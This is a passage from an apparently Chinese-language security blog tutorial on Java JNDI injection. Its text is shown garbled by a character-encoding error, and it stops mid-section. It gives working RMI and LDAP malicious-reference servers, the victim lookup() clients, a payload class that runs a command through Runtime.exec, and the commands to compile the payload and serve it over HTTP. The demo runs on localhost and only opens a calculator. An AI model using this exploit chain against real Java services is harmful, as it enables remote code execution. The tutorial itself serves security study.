Interface)æ˜¯ä¸€ä¸ªåº”ç”¨ç¨‹åºè®¾è®¡çš„ APIï¼Œä¸€ç§æ ‡å‡†çš„ Java å‘½åç³»ç»Ÿæ¥å£ã€‚JNDI æä¾›ç»Ÿä¸€çš„å®¢æˆ·ç«¯ APIï¼Œé€šè¿‡ä¸åŒçš„è®¿é—®æä¾›è€…æ¥å£JNDIæœåŠ¡ä¾›åº”æ¥å£(SPI)çš„å®ç°ï¼Œç”±ç®¡ç†è€…å°† JNDI API æ˜ å°„ä¸ºç‰¹å®šçš„å‘½åæœåŠ¡å’Œç›®å½•ç³»ç»Ÿï¼Œä½¿å¾— Java åº”ç”¨ç¨‹åºå¯ä»¥å’Œè¿™äº›å‘½åæœåŠ¡å’Œç›®å½•æœåŠ¡ä¹‹é—´è¿›è¡Œäº¤äº’ã€‚</p><p>ä¸Šé¢è¾ƒå®˜æ–¹è¯´æ³•ï¼Œé€šä¿—çš„è¯´å°±æ˜¯è‹¥ç¨‹åºå®šä¹‰äº† JDNI ä¸­çš„æ¥å£ï¼Œåˆ™å°±å¯ä»¥é€šè¿‡è¯¥æ¥å£ API è®¿é—®ç³»ç»Ÿçš„ <code>å‘½ä»¤æœåŠ¡</code>å’Œ<code>ç›®å½•æœåŠ¡</code>,å¦‚ä¸‹å›¾ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230307164854167.png" data-caption="å®˜æ–¹å›¾è§£"><img src="/../images/Java/jndi/image-20230307164854167.png" alt="å®˜æ–¹å›¾è§£"></a><br>æœ¬ç¯‡æ–‡ç« ä¸»è¦æ¢ç©¶ LADPã€RMIã€DNS åè®®ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230307171510.png" data-caption="ç›¸å…³åè®®"><img src="/../images/Java/jndi/image-20230307171510.png" alt="ç›¸å…³åè®®"></a></p><h2 id="ä¸‰ã€JNDIæ³¨å…¥"><a href="#ä¸‰ã€JNDIæ³¨å…¥" class="headerlink" title="ä¸‰ã€JNDIæ³¨å…¥"></a>ä¸‰ã€JNDIæ³¨å…¥</h2><p><code>JNDI</code> æ³¨å…¥ï¼Œå³å½“å¼€å‘è€…åœ¨å®šä¹‰ <code>JNDI</code> æ¥å£åˆå§‹åŒ–æ—¶ï¼Œ<code>lookup()</code> æ–¹æ³•çš„å‚æ•°å¯æ§ï¼Œæ”»å‡»è€…å°±å¯ä»¥å°†æ¶æ„çš„ <code>url</code> ä¼ å…¥å‚æ•°è¿œç¨‹åŠ è½½æ¶æ„è½½è·ï¼Œé€ æˆæ³¨å…¥æ”»å‡»ã€‚</p><p><strong>ä»£ç ç¤ºä¾‹ï¼š</strong></p><p>ä»£ç ä¸­å®šä¹‰äº† <code>uri</code> å˜é‡ï¼Œ<code>uri</code> å˜é‡å¯æ§ï¼Œå¹¶å®šä¹‰äº†ä¸€ä¸ª <code>rmi</code> åè®®æœåŠ¡ï¼Œ <code>rmi://127.0.0.1:1099/Exploit</code> ä¸ºæ”»å‡»è€…æ§åˆ¶çš„é“¾æ¥ï¼Œæœ€åä½¿ç”¨ <code>lookup()</code> å‡½æ•°è¿›è¡Œè¿œç¨‹è·å– <code>Exploit</code> ç±»ï¼ˆExploit ç±»åä¸ºæ”»å‡»è€…å®šä¹‰ï¼Œä¸å”¯ä¸€ï¼‰ï¼Œå¹¶æ‰§è¡Œå®ƒ</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmi.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jndi</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span>;<span class="comment">// æŒ‡å®šæŸ¥æ‰¾çš„ uri å˜é‡</span></span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();<span class="comment">// å¾—åˆ°åˆå§‹ç›®å½•ç¯å¢ƒçš„ä¸€ä¸ªå¼•ç”¨</span></span><br><span class="line">        initialContext.lookup(uri);<span class="comment">// è·å–æŒ‡å®šçš„è¿œç¨‹å¯¹è±¡</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>å…·ä½“æ”»å‡»æµç¨‹å›¾</p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230302200410650.png" data-caption="image-20230302200410650"><img src="/../images/Java/jndi/image-20230302200410650.png" alt="image-20230302200410650"></a></p><p>JNDI æ³¨å…¥å¯¹ JAVA ç‰ˆæœ¬æœ‰ç›¸åº”çš„é™åˆ¶ï¼Œå…·ä½“å¯åˆ©ç”¨ç‰ˆæœ¬å¦‚ä¸‹ï¼š</p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230307172530.png" data-caption="image-20230302200410650"><img src="/../images/Java/jndi/image-20230307172530.png" alt="image-20230302200410650"></a></p><h2 id="å››ã€JNDI-æ³¨å…¥å¤ç°"><a href="#å››ã€JNDI-æ³¨å…¥å¤ç°" class="headerlink" title="å››ã€JNDI æ³¨å…¥å¤ç°"></a>å››ã€JNDI æ³¨å…¥å¤ç°</h2><h3 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI+RMI"></a>JNDI+RMI</h3><h4 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h4><p>ä½¿ç”¨ IDEA è¿›è¡Œå¤ç°ï¼Œè¿™è¾¹ä½¿ç”¨çš„ JDK ç‰ˆæœ¬ä¸º Linux ç‰ˆæœ¬çš„ <a href="https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html#license-lightbox">JDK 7u79</a> ï¼Œ <a href="https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html#license-lightbox">Windows ç‰ˆæœ¬ä¸‹è½½</a> </p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230302200701717.png" data-caption="image-20230302200701717"><img src="/../images/Java/jndi/image-20230302200701717.png" alt="image-20230302200701717"></a></p><p>1ã€é¦–å…ˆ IDEA æ–°å»ºä¸€ä¸ªé¡¹ç›®</p><p>File-ã€‹New-ã€‹Project-ã€‹Maven-ã€‹Project SDKï¼ˆé€‰æ‹© JDK ç‰ˆæœ¬ï¼‰-ã€‹Next-ã€‹å¡«å†™é¡¹ç›®åç§°-ã€‹Finish</p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230302195107484.png" data-caption="image-20230302195107484"><img src="/../images/Java/jndi/image-20230302195107484.png" alt="image-20230302195107484"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230302195803442.png" data-caption="image-20230302195803442"><img src="/../images/Java/jndi/image-20230302195803442.png" alt="image-20230302195803442"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230302195907612.png" data-caption="image-20230302195907612"><img src="/../images/Java/jndi/image-20230302195907612.png" alt="image-20230302195907612"></a></p><p>2ã€åœ¨ <code>/src/java</code> ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªåŒ…ï¼ŒåŒ…åè‡ªå®šä¹‰ï¼Œæˆ‘è¿™è¾¹ä¸º <code>jndi_rmi_injection</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230302200005072.png" data-caption="image-20230302200005072"><img src="/../images/Java/jndi/image-20230302200005072.png" alt="image-20230302200005072"></a></p><p>3ã€åœ¨åˆ›å»ºçš„åŒ…ä¸‹æ–°å»º <code>rmi</code> æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯</p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230306154417324.png" data-caption="image-20230306154417324"><img src="/../images/Java/jndi/image-20230306154417324.png" alt="image-20230306154417324"></a></p><p>æœåŠ¡ç«¯ï¼ˆRMIService.javaï¼‰ä»£ç </p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi_rmi_injection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">7778</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Calculator&quot;</span>,<span class="string">&quot;Calculator&quot;</span>,<span class="string">&quot;http://127.0.0.1:8081/&quot;</span>);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;RCE&quot;</span>,wrapper);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>å®¢æˆ·ç«¯ï¼ˆRMIClient.javaï¼‰ä»£ç ï¼Œå®¢æˆ·ç«¯ä¹Ÿæ˜¯å—å®³ç«¯</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi_rmi_injection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="string">&quot;rmi://127.0.0.1:7778/RCE&quot;</span>;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>HTTP ç«¯æ¶æ„è½½è·ï¼ˆCalculator.javaï¼‰ä»£ç </p><p>ç¬”è€…ä½¿ç”¨çš„æ˜¯ ubuntu çš„ç¯å¢ƒï¼Œæ‰§è¡Œå¼¹å‡ºè®¡ç®—å™¨çš„å‘½ä»¤ä¸º <code>gnome-calculator</code>,è‹¥ä¸ºWindwos ä¿®æ”¹ä¸º <code>calc</code> å³å¯</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calculator</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Calculator</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;gnome-calculator&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><br/><h4 id="å¯åŠ¨æœåŠ¡"><a href="#å¯åŠ¨æœåŠ¡" class="headerlink" title="å¯åŠ¨æœåŠ¡"></a>å¯åŠ¨æœåŠ¡</h4><p>1ã€å°† HTTP ç«¯æ¶æ„è½½è· Calculator.javaï¼Œç¼–è¯‘æˆ Calculator.class æ–‡ä»¶</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac Calculator.java</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230302201002194.png" data-caption="image-20230302201002194"><img src="/../images/Java/jndi/image-20230302201002194.png" alt="image-20230302201002194"></a></p><p>2ã€åœ¨ Calculator.class ç›®å½•ä¸‹åˆ©ç”¨ Python èµ·ä¸€ä¸ªä¸´æ—¶çš„ WEB æœåŠ¡æ”¾ç½®æ¶æ„è½½è·,è¿™é‡Œçš„ç«¯å£å¿…é¡»è¦ä¸ RMIServer.java çš„ Reference é‡Œé¢çš„é“¾æ¥ç«¯å£ä¸€è‡´</p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230302201219085.png" data-caption="image-20230302201219085"><img src="/../images/Java/jndi/image-20230302201219085.png" alt="image-20230302201219085"></a></p><p>python3 -m http.server 8081</p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230302201414134.png" data-caption="image-20230302201414134"><img src="/../images/Java/jndi/image-20230302201414134.png" alt="image-20230302201414134"></a></p><p>3ã€IDEA å°†æ¼æ´ç¯å¢ƒå¯åŠ¨èµ·æ¥å¹¶å®ç°æ”»å‡»ï¼Œé¡ºåºä¸ºå…ˆè¿è¡ŒæœåŠ¡ç«¯ï¼Œå†èµ·å®¢æˆ·ç«¯</p><p>æœåŠ¡ç«¯</p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230302201657276.png" data-caption="image-20230302201657276"><img src="/../images/Java/jndi/image-20230302201657276.png" alt="image-20230302201657276"></a></p><p>å†ç‚¹å‡»è¿è¡Œå®¢æˆ·ç«¯ï¼Œè¿œç¨‹è·å–æ¶æ„ç±»ï¼Œå¹¶æ‰§è¡Œæ¶æ„ç±»ä»£ç ï¼Œå®ç°å¼¹çª—</p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230306160706036.png" data-caption="image-20230306160706036"><img src="/../images/Java/jndi/image-20230306160706036.png" alt="image-20230306160706036"></a></p><br/><h3 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI+LDAP"></a>JNDI+LDAP</h3><h4 id="ç¯å¢ƒæ­å»º-1"><a href="#ç¯å¢ƒæ­å»º-1" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h4><p>ç¯å¢ƒä½¿ç”¨ä¸Šé¢çš„å³å¯ï¼Œä½†è¦å…ˆæœ¬åœ°å¯¼å…¥ä¾èµ–ï¼Œ<code>maven</code> æ— æ³•æ‹‰å– <code>unboundid</code> è¿™ä¸ªä¾èµ–ï¼Œè¿™ä¸€æ­¥å¡äº†ä¸€æ®µæ—¶é—´ï¼Œå‘ç‚¹ä¹‹ä¸€</p><p>1ã€ç‚¹å‡»ä¸‹è½½ <a href="https://repo.maven.apache.org/maven2/com/unboundid/unboundid-ldapsdk/3.2.0/unboundid-ldapsdk-3.2.0.jar">unboundid-ldapsdk-3.2.0.jar</a>ï¼Œå¯¼å…¥ä¾èµ–å³å¯ï¼Œæœ¬ç¯å¢ƒåœ¨è·Ÿç›®å½•ä¸‹åˆ›å»ºäº† <code>/lib</code> ç›®å½•ç”¨äºæ”¾ç½®æœ¬åœ°ä¾èµ–</p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230303175437804.png" data-caption="image-20230303175437804"><img src="/../images/Java/jndi/image-20230303175437804.png" alt="image-20230303175437804"></a></p><p>2ã€LDAPServer.java æœåŠ¡ç«¯ä»£ç </p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi_ldap_injection;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAPServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8081/#Calculator&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1234</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(url)));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;Exploit&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>3ã€å®¢æˆ·ç«¯ï¼ˆLDAPClient.javaï¼‰ä»£ç ï¼Œ ä¹Ÿæ˜¯å—å®³ç«¯</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi_ldap_injection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAPClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://127.0.0.1:1234/Calculator&quot;</span>;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.lookup(url);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>4ã€HTTP ç«¯æ¶æ„è½½è·ï¼ˆCalculator.javaï¼‰ä»£ç </p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calculator</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Calculator</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;gnome-calculator&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><br/><h4 